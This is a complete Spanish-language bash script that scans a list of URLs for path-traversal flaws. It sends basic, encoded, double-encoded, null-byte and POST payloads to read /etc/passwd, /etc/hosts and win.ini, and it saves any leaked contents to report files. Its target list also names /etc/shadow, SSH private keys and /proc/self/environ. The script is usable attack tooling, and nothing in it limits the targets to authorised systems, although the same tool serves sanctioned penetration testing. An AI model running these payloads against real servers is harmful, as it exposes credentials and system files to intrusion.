#!/bin/bash
# advanced_path_traversal_tester.sh
# Script completo para detectar y confirmar vulnerabilidades de Path Traversal
# Lee URLs desde archivo url.txt (una por línea)
# Con timeout para URLs que no respondan

URL_FILE="${1:-url.txt}"
MASTER_OUTPUT="/tmp/path_traversal_master_report_$$.txt"
TIMEOUT=5
CONNECT_TIMEOUT=10  # Timeout específico para conexión
MAX_TIME=30         # Tiempo máximo total por petición

# Verificar que el archivo existe
if [ ! -f "$URL_FILE" ]; then
    echo "Error: Archivo $URL_FILE no encontrado"
    echo "Creando archivo de ejemplo..."
    echo "https://ejemplo1.com" > url.txt
    echo "http://ejemplo2.com" >> url.txt
    echo "http://192.168.1.100" >> url.txt
    echo "Archivo de ejemplo creado. Edita 'url.txt' con tus URLs."
    exit 1
fi

# Contar URLs
URL_COUNT=$(wc -l < "$URL_FILE")
echo "=================================================="
echo "    DETECTOR AVANZADO DE PATH TRAVERSAL"
echo "    Archivo de URLs: $URL_FILE"
echo "    URLs a analizar: $URL_COUNT"
echo "    Timeout conexión: ${CONNECT_TIMEOUT}s"
echo "    Timeout total: ${MAX_TIME}s"
echo "=================================================="
echo ""

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Archivos sensibles a intentar leer
SENSITIVE_FILES="
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/issue
/etc/motd
/proc/self/environ
/proc/version
/proc/cpuinfo
/var/log/messages
/var/log/auth.log
/var/log/secure
/etc/httpd/conf/httpd.conf
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/hosts.allow
/etc/hosts.deny
/home/*/.bash_history
/home/*/.ssh/id_rsa
/home/*/.ssh/authorized_keys
/root/.bash_history
/root/.ssh/id_rsa
windows/win.ini
windows/system32/drivers/etc/hosts
../../../windows/system32/drivers/etc/hosts
../../boot.ini
C:/boot.ini
C:/Windows/System32/drivers/etc/hosts
"

# Funciones de utilidad
print_success() {
    echo -e "${GREEN}[+] $1${NC}"
}

print_warning() {
    echo -e "${YELLOW}[!] $1${NC}"
}

print_error() {
    echo -e "${RED}[-] $1${NC}"
}

print_info() {
    echo -e "${BLUE}[*] $1${NC}"
}

test_connection() {
    local url="$1"
    local output_file="$2"
    
    print_info "Probando conexión a $url..."
    
    # Intentar conectar con timeout reducido
    response=$(timeout $CONNECT_TIMEOUT curl -s -k -I -w "|HTTP_STATUS:%{http_code}|TIME:%{time_total}" "$url" 2>&1)
    
    # Verificar si hay timeout
    if echo "$response" | grep -q "timed out\|Operation timed out\|timeout"; then
        echo "CONEXIÓN: Timeout (${CONNECT_TIMEOUT}s)" >> "$output_file"
        print_warning "Timeout al conectar con $url"
        return 1
    fi
    
    # Verificar otros errores de conexión
    if echo "$response" | grep -q "Could not resolve host\|Failed to connect\|Connection refused"; then
        echo "CONEXIÓN: Error - Host no alcanzable" >> "$output_file"
        print_warning "No se puede conectar a $url"
        return 1
    fi
    
    # Verificar si recibimos respuesta HTTP
    http_status=$(echo "$response" | grep -o "HTTP_STATUS:[0-9]*" | cut -d: -f2)
    
    if [ -n "$http_status" ]; then
        time_total=$(echo "$response" | grep -o "TIME:[0-9.]*" | cut -d: -f2)
        echo "CONEXIÓN: OK (HTTP $http_status, ${time_total}s)" >> "$output_file"
        print_success "Conexión exitosa a $url (HTTP $http_status)"
        return 0
    else
        echo "CONEXIÓN: Error - No response" >> "$output_file"
        print_warning "No se recibió respuesta de $url"
        return 1
    fi
}

test_path_traversal() {
    local url="$1"
    local description="$2"
    local output_file="$3"
    local test_number="$4"

    echo "" >> "$output_file"
    echo "=== Test $test_number: $description ===" >> "$output_file"
    echo "URL: $url" >> "$output_file"

    # Realizar petición con múltiples timeouts
    response=$(timeout $MAX_TIME curl -s -k --connect-timeout $CONNECT_TIMEOUT -m $MAX_TIME -w "|HTTP_STATUS:%{http_code}|SIZE:%{size_download}|TIME:%{time_total}" "$url" 2>&1)
    
    # Verificar errores de timeout
    if echo "$response" | grep -q "timed out\|Operation timed out\|timeout"; then
        echo "RESULTADO: Timeout (${MAX_TIME}s)" >> "$output_file"
        print_warning "Timeout en test $test_number: $description"
        return 4  # Código especial para timeout
    fi
    
    # Verificar otros errores de curl
    if echo "$response" | grep -q "curl:"; then
        error_msg=$(echo "$response" | grep "curl:" | head -1)
        echo "RESULTADO: Error curl - $error_msg" >> "$output_file"
        print_warning "Error en test $test_number: $error_msg"
        return 5  # Código especial para error curl
    fi

    # Extraer información de la respuesta
    http_status=$(echo "$response" | grep -o "HTTP_STATUS:[0-9]*" | cut -d: -f2)
    response_size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
    time_total=$(echo "$response" | grep -o "TIME:[0-9.]*" | cut -d: -f2)
    content=$(echo "$response" | sed 's/|HTTP_STATUS:.*//')

    echo "HTTP Status: ${http_status:-N/A}" >> "$output_file"
    echo "Response Size: ${response_size:-0} bytes" >> "$output_file"
    echo "Response Time: ${time_total:-0}s" >> "$output_file"

    # Analizar respuesta
    if [ "$http_status" = "200" ]; then
        if [ -n "$content" ]; then
            # Buscar indicadores de éxito para Linux
            if echo "$content" | grep -i -q "root:\|daemon:\|bin:\|sys:\|nobody:\|Administrator:"; then
                print_success "¡VULNERABLE! Path traversal confirmado"
                echo "RESULTADO: VULNERABLE" >> "$output_file"
                echo "CONTENT (first 10 lines):" >> "$output_file"
                echo "$content" | head -20 >> "$output_file"
                echo "---" >> "$output_file"
                return 0
            # Buscar indicadores para Windows
            elif echo "$content" | grep -i -q "\[boot loader\]\|\[fonts\]\|\[extensions\]\|127.0.0.1.*localhost"; then
                print_success "¡VULNERABLE! Path traversal confirmado (Windows)"
                echo "RESULTADO: VULNERABLE" >> "$output_file"
                echo "CONTENT (first 10 lines):" >> "$output_file"
                echo "$content" | head -20 >> "$output_file"
                echo "---" >> "$output_file"
                return 0
            elif [ "$response_size" -gt 1000 ] && [ "$response_size" -lt 100000 ]; then
                print_warning "Respuesta larga ($response_size bytes) - Posible éxito"
                echo "RESULTADO: SUSPICIOUS (large response)" >> "$output_file"
                echo "Primeras líneas:" >> "$output_file"
                echo "$content" | head -10 >> "$output_file"
                return 1
            else
                echo "RESULTADO: OK (no signs of vulnerability)" >> "$output_file"
            fi
        else
            echo "RESULTADO: OK (empty response)" >> "$output_file"
        fi
    elif [ -n "$http_status" ]; then
        if [ "$http_status" = "403" ] || [ "$http_status" = "404" ]; then
            echo "RESULTADO: Blocked (HTTP $http_status)" >> "$output_file"
        elif [ "$http_status" = "500" ]; then
            print_warning "Error 500 - Posible vector válido pero con error"
            echo "RESULTADO: Error 500" >> "$output_file"
            return 2
        elif [ "$http_status" = "400" ]; then
            echo "RESULTADO: Bad Request (HTTP 400)" >> "$output_file"
        elif [ "$http_status" = "401" ] || [ "$http_status" = "407" ]; then
            echo "RESULTADO: Authentication Required (HTTP $http_status)" >> "$output_file"
        elif [ "$http_status" -ge 300 ] && [ "$http_status" -lt 400 ]; then
            echo "RESULTADO: Redirect (HTTP $http_status)" >> "$output_file"
        else
            echo "RESULTADO: HTTP $http_status" >> "$output_file"
        fi
    else
        echo "RESULTADO: No HTTP response" >> "$output_file"
    fi

    return 3
}

# Funciones para diferentes tipos de pruebas
test_with_parameter() {
    local base_url="$1"
    local param="$2"
    local file_path="$3"
    local test_name="$4"
    local output_file="$5"
    local test_number="$6"
    
    test_path_traversal "${base_url}?${param}=${file_path}" "$test_name" "$output_file" "$test_number"
}

test_direct_access() {
    local url="$1"
    local test_name="$2"
    local output_file="$3"
    local test_number="$4"
    
    test_path_traversal "$url" "$test_name" "$output_file" "$test_number"
}

# Lista de parámetros comunes
COMMON_PARAMS="
file
filename
path
document
doc
page
template
include
load
read
src
view
content
image
img
url
download
redirect
data
input
output
"

# Variables para resumen global
TOTAL_VULNERABLE=0
TOTAL_TIMEOUT=0
TOTAL_ERRORS=0
VULNERABLE_URLS=""
TIMEOUT_URLS=""
ERROR_URLS=""
SAFE_URLS=""

# Procesar cada URL del archivo
URL_NUMBER=0

while IFS= read -r TARGET || [ -n "$TARGET" ]; do
    # Saltar líneas vacías y comentarios
    TARGET=$(echo "$TARGET" | sed 's/#.*//' | xargs)
    [ -z "$TARGET" ] && continue
    
    URL_NUMBER=$((URL_NUMBER + 1))
    
    echo ""
    echo "=================================================="
    echo "    ANALIZANDO URL $URL_NUMBER de $URL_COUNT"
    echo "    Target: $TARGET"
    echo "=================================================="
    
    # Crear archivo de salida para esta URL
    URL_SANITIZED=$(echo "$TARGET" | sed 's/[^a-zA-Z0-9]/_/g')
    URL_OUTPUT="/tmp/path_traversal_${URL_SANITIZED}_$$.txt"
    
    # Inicio del análisis para esta URL
    print_info "Iniciando análisis de Path Traversal..."
    echo "Reporte de Path Traversal - $(date)" > "$URL_OUTPUT"
    echo "Target: $TARGET" >> "$URL_OUTPUT"
    echo "Timeout conexión: ${CONNECT_TIMEOUT}s" >> "$URL_OUTPUT"
    echo "Timeout total: ${MAX_TIME}s" >> "$URL_OUTPUT"
    echo "" >> "$URL_OUTPUT"
    
    # Primero probar conexión básica
    if ! test_connection "$TARGET" "$URL_OUTPUT"; then
        print_error "No se pudo conectar a $TARGET - Saltando..."
        TOTAL_ERRORS=$((TOTAL_ERRORS + 1))
        ERROR_URLS="${ERROR_URLS}\n- $TARGET (conexión fallida)"
        
        # Agregar al reporte maestro
        echo "==================================================" >> "$MASTER_OUTPUT"
        echo "URL: $TARGET" >> "$MASTER_OUTPUT"
        echo "Estado: CONNECTION_ERROR" >> "$MASTER_OUTPUT"
        echo "Error: No se pudo establecer conexión" >> "$MASTER_OUTPUT"
        echo "Reporte: $URL_OUTPUT" >> "$MASTER_OUTPUT"
        continue
    fi
    
    # Variables para esta URL
    basic_success=0
    encoded_success=0
    param_success=0
    null_success=0
    advanced_success=0
    path_success=0
    multiparam_success=0
    post_success=0
    ua_success=0
    header_success=0
    test_timeout=0
    test_error=0
    
    # Contador de tests
    TEST_COUNTER=0
    
    # ============================================================================
    # PRUEBA 1: Vectores básicos de Path Traversal (limitado por timeout)
    # ============================================================================
    print_info "1. Probando vectores básicos de Path Traversal..."
    
    # Limitar pruebas para evitar timeout excesivo
    BASIC_FILES="/etc/passwd /etc/hosts windows/win.ini"
    for file in $BASIC_FILES; do
        for i in 3 4 5; do
            TEST_COUNTER=$((TEST_COUNTER + 1))
            dots=$(printf '../%.0s' $(seq 1 $i))
            test_direct_access "$TARGET${dots}${file}" "Basic: ${dots}${file}" "$URL_OUTPUT" "$TEST_COUNTER"
            result=$?
            if [ $result -eq 0 ]; then
                basic_success=1
            elif [ $result -eq 4 ]; then
                test_timeout=$((test_timeout + 1))
                if [ $test_timeout -ge 3 ]; then
                    print_warning "Muchos timeouts, saltando pruebas restantes para esta URL"
                    break 2
                fi
            elif [ $result -eq 5 ]; then
                test_error=$((test_error + 1))
            fi
        done
    done
    
    # Si hay muchos timeouts, saltar al siguiente URL
    if [ $test_timeout -ge 5 ]; then
        print_error "Demasiados timeouts para $TARGET - Saltando al siguiente URL"
        TOTAL_TIMEOUT=$((TOTAL_TIMEOUT + 1))
        TIMEOUT_URLS="${TIMEOUT_URLS}\n- $TARGET (múltiples timeouts)"
        continue
    fi
    
    # ============================================================================
    # PRUEBA 2: Encoding básico (limitado)
    # ============================================================================
    print_info "2. Probando encoding básico..."
    
    ENCODED_VECTORS="
    ..%2f..%2f..%2fetc%2fpasswd
    ..%252f..%252f..%252fetc%252fpasswd
    %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
    ..%5c..%5c..%5cetc%5cpasswd
    "
    
    for vector in $ENCODED_VECTORS; do
        TEST_COUNTER=$((TEST_COUNTER + 1))
        test_direct_access "$TARGET$vector" "Encoded: $vector" "$URL_OUTPUT" "$TEST_COUNTER"
        result=$?
        if [ $result -eq 0 ]; then
            encoded_success=1
        elif [ $result -eq 4 ]; then
            test_timeout=$((test_timeout + 1))
            [ $test_timeout -ge 3 ] && break
        fi
    done
    
    # ============================================================================
    # PRUEBA 3: Pruebas con parámetros comunes (limitado)
    # ============================================================================
    print_info "3. Probando con parámetros comunes..."
    
    # Limitar a 3 parámetros principales
    MAIN_PARAMS="file path src"
    for param in $MAIN_PARAMS; do
        for file in "/etc/passwd" "/etc/hosts"; do
            TEST_COUNTER=$((TEST_COUNTER + 1))
            dots="../../../"
            test_with_parameter "$TARGET" "$param" "${dots}${file}" "Param: $param - ${dots}${file}" "$URL_OUTPUT" "$TEST_COUNTER"
            result=$?
            if [ $result -eq 0 ]; then
                param_success=1
            elif [ $result -eq 4 ]; then
                test_timeout=$((test_timeout + 1))
                [ $test_timeout -ge 3 ] && break 2
            fi
        done
    done
    
    # ============================================================================
    # PRUEBA 4: Null byte injection (rápido)
    # ============================================================================
    print_info "4. Probando Null Byte Injection..."
    
    NULL_BYTE_VECTORS="
    ../../../etc/passwd%00
    ../../../../etc/passwd%00.jpg
    "
    
    for vector in $NULL_BYTE_VECTORS; do
        TEST_COUNTER=$((TEST_COUNTER + 1))
        test_direct_access "$TARGET$vector" "Null Byte: $vector" "$URL_OUTPUT" "$TEST_COUNTER"
        result=$?
        if [ $result -eq 0 ]; then
            null_success=1
        elif [ $result -eq 4 ]; then
            test_timeout=$((test_timeout + 1))
            [ $test_timeout -ge 3 ] && break
        fi
    done
    
    # ============================================================================
    # PRUEBA 5: Double encoding (limitado)
    # ============================================================================
    print_info "5. Probando Double Encoding..."
    
    ADVANCED_VECTORS="
    ..%252f..%252f..%252fetc/passwd
    %2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
    "
    
    for vector in $ADVANCED_VECTORS; do
        TEST_COUNTER=$((TEST_COUNTER + 1))
        test_direct_access "$TARGET$vector" "Advanced: $vector" "$URL_OUTPUT" "$TEST_COUNTER"
        result=$?
        if [ $result -eq 0 ]; then
            advanced_success=1
        elif [ $result -eq 4 ]; then
            test_timeout=$((test_timeout + 1))
            [ $test_timeout -ge 3 ] && break
        fi
    done
    
    # ============================================================================
    # PRUEBA 6: Pruebas POST (una sola)
    # ============================================================================
    print_info "6. Probando con método POST..."
    
    TEST_COUNTER=$((TEST_COUNTER + 1))
    echo "" >> "$URL_OUTPUT"
    echo "=== Test $TEST_COUNTER: POST method ===" >> "$URL_OUTPUT"
    echo "URL: $TARGET" >> "$URL_OUTPUT"
    echo "Data: file=../../../etc/passwd" >> "$URL_OUTPUT"
    
    response=$(timeout $MAX_TIME curl -s -k --connect-timeout $CONNECT_TIMEOUT -m $MAX_TIME -X POST -d "file=../../../etc/passwd" -w "|HTTP_STATUS:%{http_code}" "$TARGET" 2>&1)
    
    if echo "$response" | grep -q "timed out\|Operation timed out\|timeout"; then
        echo "RESULTADO: Timeout (${MAX_TIME}s)" >> "$URL_OUTPUT"
        test_timeout=$((test_timeout + 1))
    else
        http_status=$(echo "$response" | grep -o "HTTP_STATUS:[0-9]*" | cut -d: -f2)
        
        if [ "$http_status" = "200" ]; then
            content=$(echo "$response" | sed 's/|HTTP_STATUS:.*//')
            if echo "$content" | grep -i -q "root:\|\[boot loader\]"; then
                print_success "POST method vulnerable"
                post_success=1
                echo "RESULTADO: VULNERABLE" >> "$URL_OUTPUT"
                echo "CONTENT (first 5 lines):" >> "$URL_OUTPUT"
                echo "$content" | head -5 >> "$URL_OUTPUT"
            else
                echo "RESULTADO: OK" >> "$URL_OUTPUT"
            fi
        else
            echo "RESULTADO: HTTP $http_status" >> "$URL_OUTPUT"
        fi
    fi
    
    # ============================================================================
    # RESUMEN PARA ESTA URL
    # ============================================================================
    echo "" >> "$URL_OUTPUT"
    echo "==================================================" >> "$URL_OUTPUT"
    echo "                RESUMEN DEL ANÁLISIS" >> "$URL_OUTPUT"
    echo "==================================================" >> "$URL_OUTPUT"
    echo "" >> "$URL_OUTPUT"
    
    echo "Total tests realizados: $TEST_COUNTER" >> "$URL_OUTPUT"
    echo "Tests con timeout: $test_timeout" >> "$URL_OUTPUT"
    echo "Tests con error: $test_error" >> "$URL_OUTPUT"
    echo "" >> "$URL_OUTPUT"
    
    # Contar vulnerabilidades encontradas
    vuln_count=0
    [ $basic_success -eq 1 ] && vuln_count=$((vuln_count + 1))
    [ $encoded_success -eq 1 ] && vuln_count=$((vuln_count + 1))
    [ $param_success -eq 1 ] && vuln_count=$((vuln_count + 1))
    [ $null_success -eq 1 ] && vuln_count=$((vuln_count + 1))
    [ $advanced_success -eq 1 ] && vuln_count=$((vuln_count + 1))
    [ $post_success -eq 1 ] && vuln_count=$((vuln_count + 1))
    
    echo "Total de técnicas exitosas: $vuln_count/6" >> "$URL_OUTPUT"
    echo "" >> "$URL_OUTPUT"
    
    # Agregar al reporte maestro
    echo "==================================================" >> "$MASTER_OUTPUT"
    echo "URL: $TARGET" >> "$MASTER_OUTPUT"
    
    if [ $test_timeout -ge 5 ]; then
        echo "Estado: TIMEOUT" >> "$MASTER_OUTPUT"
        echo "Tests realizados: $TEST_COUNTER" >> "$MASTER_OUTPUT"
        echo "Timeouts: $test_timeout" >> "$MASTER_OUTPUT"
        TOTAL_TIMEOUT=$((TOTAL_TIMEOUT + 1))
        TIMEOUT_URLS="${TIMEOUT_URLS}\n- $TARGET ($test_timeout timeouts)"
    elif [ $vuln_count -gt 0 ]; then
        echo "Estado: VULNERABLE" >> "$MASTER_OUTPUT"
        echo "Técnicas exitosas: $vuln_count/6" >> "$MASTER_OUTPUT"
        echo "Tests realizados: $TEST_COUNTER" >> "$MASTER_OUTPUT"
        echo "Timeouts: $test_timeout" >> "$MASTER_OUTPUT"
        TOTAL_VULNERABLE=$((TOTAL_VULNERABLE + 1))
        VULNERABLE_URLS="${VULNERABLE_URLS}\n- $TARGET ($vuln_count técnicas)"
        
        echo "" >> "$MASTER_OUTPUT"
        echo "Técnicas exitosas:" >> "$MASTER_OUTPUT"
        [ $basic_success -eq 1 ] && echo "- Vectores básicos" >> "$MASTER_OUTPUT"
        [ $encoded_success -eq 1 ] && echo "- Encoding básico" >> "$MASTER_OUTPUT"
        [ $param_success -eq 1 ] && echo "- Diferentes parámetros" >> "$MASTER_OUTPUT"
        [ $null_success -eq 1 ] && echo "- Null byte injection" >> "$MASTER_OUTPUT"
        [ $advanced_success -eq 1 ] && echo "- Técnicas avanzadas" >> "$MASTER_OUTPUT"
        [ $post_success -eq 1 ] && echo "- Método POST" >> "$MASTER_OUTPUT"
    else
        echo "Estado: SAFE" >> "$MASTER_OUTPUT"
        echo "Tests realizados: $TEST_COUNTER" >> "$MASTER_OUTPUT"
        echo "Timeouts: $test_timeout" >> "$MASTER_OUTPUT"
        SAFE_URLS="${SAFE_URLS}\n- $TARGET"
    fi
    
    echo "Reporte detallado: $URL_OUTPUT" >> "$MASTER_OUTPUT"
    
    if [ $vuln_count -gt 0 ]; then
        print_error "¡VULNERABILIDAD DE PATH TRAVERSAL CONFIRMADA!"
        echo "ESTADO: ${RED}VULNERABLE${NC}" >> "$URL_OUTPUT"
        echo "El servidor es vulnerable a Path Traversal" >> "$URL_OUTPUT"
        
        echo "" >> "$URL_OUTPUT"
        echo "IMPACTO:" >> "$URL_OUTPUT"
        echo "• Lectura de archivos sensibles del sistema" >> "$URL_OUTPUT"
        echo "• Posible escalada a RCE (Remote Code Execution)" >> "$URL_OUTPUT"
        echo "• Exposición de información crítica" >> "$URL_OUTPUT"
        echo "• Violación de confidencialidad" >> "$URL_OUTPUT"
    
        echo "" >> "$URL_OUTPUT"
        echo "RECOMENDACIONES INMEDIATAS:" >> "$URL_OUTPUT"
        echo "1. Validar y sanitizar todas las entradas de usuario" >> "$URL_OUTPUT"
        echo "2. Implementar whitelist de caracteres permitidos" >> "$URL_OUTPUT"
        echo "3. Usar rutas canónicas absolutas" >> "$URL_OUTPUT"
        echo "4. Implementar WAF (Web Application Firewall)" >> "$URL_OUTPUT"
        echo "5. Restringir acceso a directorios del sistema" >> "$URL_OUTPUT"
        echo "6. Actualizar todos los componentes del servidor" >> "$URL_OUTPUT"
    elif [ $test_timeout -ge 3 ]; then
        print_warning "Múltiples timeouts detectados"
        echo "ESTADO: ${YELLOW}TIMEOUT${NC}" >> "$URL_OUTPUT"
        echo "El servidor responde lentamente o tiene problemas de conexión" >> "$URL_OUTPUT"
    else
        print_success "No se encontraron vulnerabilidades de Path Traversal"
        echo "ESTADO: ${GREEN}SAFE${NC}" >> "$URL_OUTPUT"
        echo "El servidor parece estar protegido contra Path Traversal" >> "$URL_OUTPUT"
    fi
    
    echo "" >> "$URL_OUTPUT"
    echo "==================================================" >> "$URL_OUTPUT"
    echo "Análisis completado: $(date)" >> "$URL_OUTPUT"
    echo "Tiempo total estimado: ~$((TEST_COUNTER * 2))s" >> "$URL_OUTPUT"
    
    # Mostrar resumen de esta URL en pantalla
    echo ""
    echo "Resumen para $TARGET:"
    echo "  Tests realizados: $TEST_COUNTER"
    echo "  Timeouts: $test_timeout"
    echo "  Estado: $([ $vuln_count -gt 0 ] && echo -e "${RED}VULNERABLE${NC}" || ([ $test_timeout -ge 3 ] && echo -e "${YELLOW}TIMEOUT${NC}") || echo -e "${GREEN}SAFE${NC}")"
    echo "  Técnicas exitosas: $vuln_count/6"
    echo "  Reporte detallado: $URL_OUTPUT"
    echo ""
    
    # Pequeña pausa entre URLs para no saturar
    sleep 1
    
done < "$URL_FILE"

# ============================================================================
# RESUMEN GLOBAL
# ============================================================================
echo ""
echo "=================================================="
echo "             RESUMEN GLOBAL DEL ANÁLISIS"
echo "=================================================="
echo "Archivo analizado: $URL_FILE"
echo "Total de URLs: $URL_COUNT"
echo "URLs analizadas: $((URL_NUMBER - TOTAL_ERRORS))"
echo "URLs vulnerables: $TOTAL_VULNERABLE"
echo "URLs con timeout: $TOTAL_TIMEOUT"
echo "URLs con error: $TOTAL_ERRORS"
echo "URLs seguras: $((URL_NUMBER - TOTAL_VULNERABLE - TOTAL_TIMEOUT - TOTAL_ERRORS))"
echo ""

if [ $TOTAL_VULNERABLE -gt 0 ]; then
    echo -e "${RED}URLs VULNERABLES:${NC}"
    echo -e "$VULNERABLE_URLS"
    echo ""
fi

if [ $TOTAL_TIMEOUT -gt 0 ]; then
    echo -e "${YELLOW}URLs CON TIMEOUT:${NC}"
    echo -e "$TIMEOUT_URLS"
    echo ""
fi

if [ $TOTAL_ERRORS -gt 0 ]; then
    echo -e "${RED}URLs CON ERROR:${NC}"
    echo -e "$ERROR_URLS"
    echo ""
fi

if [ $((URL_NUMBER - TOTAL_VULNERABLE - TOTAL_TIMEOUT - TOTAL_ERRORS)) -gt 0 ]; then
    echo -e "${GREEN}URLs SEGURAS:${NC}"
    echo -e "$SAFE_URLS"
    echo ""
fi

# Generar reporte maestro final
MASTER_FINAL="/tmp/path_traversal_final_report_$$.txt"
echo "==================================================" > "$MASTER_FINAL"
echo "       REPORTE MAESTRO PATH TRAVERSAL" >> "$MASTER_FINAL"
echo "       Fecha: $(date)" >> "$MASTER_FINAL"
echo "       Configuración:" >> "$MASTER_FINAL"
echo "       - Timeout conexión: ${CONNECT_TIMEOUT}s" >> "$MASTER_FINAL"
echo "       - Timeout total: ${MAX_TIME}s" >> "$MASTER_FINAL"
echo "==================================================" >> "$MASTER_FINAL"
echo "" >> "$MASTER_FINAL"
echo "ARCHIVO ANALIZADO: $URL_FILE" >> "$MASTER_FINAL"
echo "TOTAL DE URLS EN ARCHIVO: $URL_COUNT" >> "$MASTER_FINAL"
echo "URLS PROCESADAS: $URL_NUMBER" >> "$MASTER_FINAL"
echo "" >> "$MASTER_FINAL"
echo "RESULTADOS:" >> "$MASTER_FINAL"
echo "  URLs vulnerables: $TOTAL_VULNERABLE" >> "$MASTER_FINAL"
echo "  URLs con timeout: $TOTAL_TIMEOUT" >> "$MASTER_FINAL"
echo "  URLs con error conexión: $TOTAL_ERRORS" >> "$MASTER_FINAL"
echo "  URLs seguras: $((URL_NUMBER - TOTAL_VULNERABLE - TOTAL_TIMEOUT - TOTAL_ERRORS))" >> "$MASTER_FINAL"
echo "" >> "$MASTER_FINAL"

if [ $TOTAL_VULNERABLE -gt 0 ]; then
    echo "URLs VULNERABLES:" >> "$MASTER_FINAL"
    echo -e "$VULNERABLE_URLS" | sed 's/\\n/\n/g' >> "$MASTER_FINAL"
    echo "" >> "$MASTER_FINAL"
fi

if [ $TOTAL_TIMEOUT -gt 0 ]; then
    echo "URLs CON TIMEOUT:" >> "$MASTER_FINAL"
    echo -e "$TIMEOUT_URLS" | sed 's/\\n/\n/g' >> "$MASTER_FINAL"
    echo "" >> "$MASTER_FINAL"
fi

if [ $TOTAL_ERRORS -gt 0 ]; then
    echo "URLs CON ERROR DE CONEXIÓN:" >> "$MASTER_FINAL"
    echo -e "$ERROR_URLS" | sed 's/\\n/\n/g' >> "$MASTER_FINAL"
    echo "" >> "$MASTER_FINAL"
fi

echo "REPORTES INDIVIDUALES GENERADOS:" >> "$MASTER_FINAL"
echo "--------------------------------" >> "$MASTER_FINAL"
for file in /tmp/path_traversal_*_$$.txt; do
    if [ -f "$file" ]; then
        url=$(grep "^Target:" "$file" | head -1 | cut -d: -f2- | xargs)
        status=$(grep "^ESTADO:" "$file" | head -1 | cut -d: -f2- | sed 's/\\033//g' | xargs)
        echo "- $file" >> "$MASTER_FINAL"
        echo "  URL: $url" >> "$MASTER_FINAL"
        echo "  Estado: $status" >> "$MASTER_FINAL"
    fi
done

echo ""
print_info "Reporte maestro guardado en: $MASTER_FINAL"
print_info "Reportes individuales en: /tmp/path_traversal_*_$$.txt"

# Opciones para re-intentar URLs con timeout
if [ $TOTAL_TIMEOUT -gt 0 ]; then
    echo ""
    print_warning "Para re-intentar URLs con timeout con mayor tiempo:"
    echo "  CONNECT_TIMEOUT=20 MAX_TIME=60 ./$(basename "$0") $URL_FILE"
fi

# Ejemplo de archivo url.txt
echo ""
print_info "Formato del archivo url.txt:"
echo "# Comentarios con #"
echo "https://ejemplo1.com"
echo "http://192.168.1.100"
echo "http://sitio.com/ruta/especifica"
